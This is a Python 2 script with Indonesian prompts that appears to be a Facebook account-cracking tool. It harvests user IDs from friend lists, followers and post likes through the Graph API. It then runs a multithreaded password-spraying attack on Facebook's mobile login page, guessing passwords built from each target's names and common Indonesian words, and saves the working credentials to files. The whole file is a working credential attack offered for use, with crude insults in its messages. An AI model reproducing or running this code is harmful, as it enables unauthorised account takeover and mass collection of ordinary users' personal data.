#!/usr/bin/python2
# coding=utf-8
# code by alvin
import os,sys,uuid,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,bs4
from multiprocessing.pool import ThreadPool
def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')

#### WARNA RANDOM ####
P  = '\033[1;97m'  # putih
M  = '\033[1;91m' # merah
H  = '\033[1;92m' # hijau
K = '\033[1;93m' # kuning
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # ungu
O = '\033[1;96m' # biru cerah
I = '\033[0m' # mati
my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)

try:
        import mechanize
except ImportError:
        os.system("pip2 install mechanize")
try:
        import requests
except ImportError:
        os.system("pip2 install requests")
        os.system("python2 crack.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
useragents = [('Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36')]
hm = random.choice(useragents)
reload(sys)
sys.setdefaultencoding('utf8')
os.system('clear')
animasi = ["[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■] Suskes !"]
for i in range(len(animasi)):
    time.sleep(0.1)
    sys.stdout.write("\r\x1b[0;93mLoading : "+ random.choice(['\x1b[0;93m', '\x1b[0;96m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;95m']) + animasi[i % len(animasi)])
    sys.stdout.flush()
    
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'}

def keluar():
        print "[!] Byeee kontol"
        os.sys.exit()

def hapus():
	os.system('clear')
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
	
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
    
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r \033[1;97m[\033[1;93m•\033[1;97m] please wait\033[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.02)

def logo():
	os.system('echo -e "  _____ ___ ___  ____   _____ \n / ___/|   |   ||    \ |     |\n(   \_ | _   _ ||  o  )|   __|\n \__  ||  \_/  ||     ||  |_  \n /  \ ||   |   ||  O  ||   _] \n \    ||   |   ||     ||  |   \n  \___||___|___||_____||__|\n" | lolcat')

pw = False
back = 0
loop = 0
threads = []
ok = []
cp = []
id = []
Successful = []
Checkpoint = []
done = []
pw = []
target = []

### MASUK ###
def masuk():
        os.system("clear")
        logo()
        print "\n["+O+"1"+I+"] Login using Facebook Token"
        print "["+O+"2"+I+"] Login using Facebook User/Pass"+"\n"
        pilih()

#input pilihan
def pilih():
        m = raw_input("[*] choose : ")
        if m =="":
                print "[!] choose really stupid!!"
                time.sleep(2)
                os.system("clear")
                masuk()
        elif m =="1":
                login_token()
        elif m =="2":
                login_email()
        else:
                print "[!] choose really stupid!!"
                time.sleep(2)
                os.system("clear")
                masuk()

#masuk dengan cookies
def login_email():
	os.system("clear")
	logo()
	email = raw_input("\33[1;97mEmail/id anda \33[1;91m>\33[1;92m ");time.sleep(0.07)
	pw = raw_input("\33[1;97mPassword anda \33[1;91m>\33[1;92m ");time.sleep(0.07)
	jalan ("\33[1;93mSedang masuk ... ")
	data={"email":email,"pass":pw,"login":"submit"}
	head={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36"}
	with requests.Session() as c:
		try:
			url = "https://touch.facebook.com/login.php"
			b = c.post(url, data=data, headers=head)
			coki = c.get("https://touch.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_")
			if "home" in b.url or "get" in b.url or "save" in b.url:
				find = re.search("(EAAA\+)", coki.text)
				res = find.group(1)
				open("login.txt", "w").write(res)
				print "\33[1;92m login berhasil √"
				time.sleep(2)
				os.system("clear")
				menu()
			elif "email" in b.url or "login" in b.url or "recover" in b.url:
				print "\33[1;97m Email/pw salah ×"
				time.sleep(2)
				os.system("clear")
				masuk()
			elif "checkpoint" in b.url or "confirm" in b.url:
				print "\33[1;93m Akun terkena checkpoint !"
				time.sleep(2)
				os.system("clear")
				masuk()
		except requests.exceptions.ConnectionError:
			print "\33[1;97m Koneksi bermasalah"
			exit()

### LOGIN TOKEN ###
def login_token():
	os.system('clear')
	logo()
	toket = raw_input("Token > ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print 'Berhasil Masuk'
		menu()
	except KeyError:
		print 'Token salah '
		time.sleep(1.7)
		masuk()
	except requests.exceptions.SSLError:
		print 'Koneksi Bermasalah'
		exit()
### ORANG GANTENG ###
def menu():
	os.system('clear')
	try:
		token=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print "[!] Cookies/token Invalid"
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print "[!] Cookies/token Invalid"
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	except requests.exceptions.ConnectionError:
		print "[!] no connection"
		exit()
	ip = requests.get("https://api.ipify.org").text
	os.system("clear")
	logo()
	print ("\33[1;97mIP Addres     : " +ip)
	print "\n[selamat datang \33[1;93m"+nama+"\33[1;97m]\n"
	print "[1] Dump id from friends"
	print "[2] Dump id from friends public"
	print "[3] Dump id from total followers"
	print "[4] Dump id from link post"
	print "[5] Start crack"
	print "[0] Exit"
	pilih_kontol()

def pilih_kontol():
        vin = raw_input("\n[*] choose : ")
        if vin == "":
           print '\n\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Wrong Input'
           time.sleep(1.7)
           os.system('clear')
           menu()
        elif vin =="1":
                teman()
        elif vin =="2":
                publik()
        elif vin =="3":
                followers()
        elif vin =="4":
                postingan()
        elif vin =="5":
                crack()
                exit()
        elif vin =="0":
                os.system('rm -rf login.txt')
                exit()
        else:
            print '\n\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Wrong Input'
            time.sleep(0.2)
            os.system('clear')
            menu()
### CRACK TEMAN ###
def teman():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit("[!] token invalid ")
        ih = raw_input("\n[?] file name : ")
        if ih in [""]:
                exit("\n[!] the correct content")    
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "[*] dump %s please wait "%(len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n\n[✓] successfully dump friend id\n"
            exit("[•] files save in : dump/%s.txt "%(ih))
        except OSError:
            exit("\n[!] failed to save file")
### CRACK PUBLIK ###
def publik():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit("[!] token invalid ")
        ah = raw_input("[?] id public : ")
        ih = raw_input("[?] file name : ")
        asw = raw_input("[?] limit : ")
        if asw in [""]:
            exit("\n[!] the correct content")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in  s.get(api.format("%s/friends?limit=%s&access_token=%s"%(ah,asw,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "[*] id %s total dump %s please wait "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n\n[✓] successfully dump the public id\n"
            exit("[•] files save in : dump/%s.txt "%(ih))
        except OSError:
            exit("\n[!] failed to save file")
### CRACK FOLLOWERS ###
def followers():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit("[!] token invalid ")
        ih = raw_input("\n[?] id followers : ")
        ah = raw_input("[?] file name : ")
        asw = raw_input("[?] limit : ")
        if ih in [""]:
                exit( "\n[!] the correct content")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ah+".txt","w")
        try:
            for i in  s.get(api.format("%s/subscribers?limit=%s&access_token=%s"%(ih,asw,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "[*] id %s total dump %s please wait "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n[✓] successfully dump id followers\n"
            exit("[•] file save in : dump/%s.txt "%(ah))
        except OSError:
            exit("\n[!] failed to save file")
### CRACK POSTINGAN ###
def postingan():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit("[!] token invalid ")
        ah = raw_input("[?] id post : ")
        ih = raw_input("[?] file name : ")
        asw = raw_input("[?] limit : ")
        if ah in [""]:
            exit("\n[!] the correct content")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in  s.get(api.format("%s/likes?limit=%s&access_token=%s"%(ah,asw,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "[*] id %s total dump %s  "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n[✓] berhasil dump id postingan\n"
            exit("[*] file tesimpan di : dump/%s.txt "%(ih))
        except OSError:
                exit("\n[!] failed to save file")
### MULAI PENGECROTAN ###
def crack():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit("[!] token invalid ")
        ask = raw_input("[?] password manual [y/n]: ")
        if ask.lower() == "y":
                man()
        file=raw_input("[?] file dump : ")
        if file in [""]:
                exit("[!] wrong file")
        try:
                fil = open(file,"r").readlines()
                for id in fil:
                        target.append(id.strip())
        except KeyError:
                exit("[!] file does not exist")
        print "\n[+] OK results saved to : ok.txt\n [-] CP results saved to : cp.txt\n"
        print "[!] press ctrl + z to pause the process\n"
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(crack_mbasic,target)
        results(Successful,Checkpoint)
        exit()

def crack_mbasic(user):
	global loop
	try:
		a = s.get(api.format('%s?access_token=%s' % (user, token)), headers=hea).json()
		dp = a['first_name'].lower()
		bk = a['last_name'].lower()
		for password in [dp+'123',dp+'1234',dp+'12345',bk+'bismillah','sayang', 'bangsat', 'rahasia']:
			rex = requests.post("https://touch.facebook.com/login.php", data={"email": user, "pass": password, "login": "submit"}, headers={"user-agent": "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"})
			xo = rex.content
			if "home" in xo or "get" in xo or "save" in xo or "actor" in xo:
				print '\x1b[1;32m* --> ' +user+ ' | ' +password
				Successful.append(user+' | '+password)
				save = open('ok.txt','a')
				save.write(str(user)+' | '+str(password)+'\n')
				save.close()
				break
			elif "checkpoint" in xo or "confirm" in xo or "cuid" in xo:
				print '\x1b[1;33m* --> ' +user+ ' | ' +password
				Checkpoint.append(user+' | '+password)
				save = open('cp.txt','a')
				save.write(str(user)+' | '+str(password)+'\n')
				save.close()
				break
				
		loop += 1
                print "\x1b[1;37m[*] crack: %s/%s - ok-:%s - cp-:%s"%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
        except:
                pass

def man():
        global pw,loop
        try:
                idt = raw_input("[*] file dump : ")
                for id in open(idt,"r").readlines():
                        target.append(id.strip())
        except KeyError:
                exit("[!] file does not exist")
        print ("\n[*] example \x1b[1;32m[ \x1b[1;33msayang,doraemon,rahasia \x1b[1;32m]")
        pw = raw_input("[?] password : ").split(",")
        if len(pw) ==0:
                exit("[!] can not be empty")
        print "\n\33[1;97m[+] OK results saved to : ok.txt"
        print "[-] CP results saved to : cp.txt\n"
        print "[!] press ctrl + z to pause the process\n"
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(cs,target)
        results(Successful,Checkpoint)
        exit()

def cs(user):
	global loop,pw
	try:
		
		for i in pw:
			rex = requests.post("https://touch.facebook.com/login.php", data={"email": user, "pass": i, "login": "submit"}, headers={"user-agent": "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"})
			xo = rex.content
			if "home" in xo or "get" in xo or "save" in xo or "actor" in xo:
				print '\x1b[1;92m* --> ' +user+ ' | ' +i
				Successful.append(user+' | '+password)
				save = open('ok.txt','a')
				save.write(str(user)+' | '+str(password)+'\n')
				save.close()
				break
			elif "checkpoint" in xo or "confirm" in xo or "cuid" in xo:
				print '\x1b[1;93m* --> ' +user+ ' | ' +i
				Checkpoint.append(user+' | '+i)
				save = open('cp.txt','a')
				save.write(str(user)+' | '+str(i)+'\n')
				save.close()
				break
				
		loop += 1
                print "\x1b[1;37m[*] crack: %s/%s - ok-:%s - cp-:%s"%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
        except:
                pass


def results(Successful,Checkpoint):
        if len(Successful) !=0:
                print ("\n\n[\033[1;37m*\033[0m] \033[37mOK : "+str(len(Successful)))
        if len(Checkpoint) !=0:
                print ("\n\n[\033[1;33m\033[0m] \033[33mCP : "+str(len(Checkpoint)))
        if len(Successful) ==0 and len(Checkpoint) ==0:
                print "\n"
                print ("[\033[1;31m#\033[0m] you got no results")
            
if __name__ == '__main__':
	menu()
	masuk()
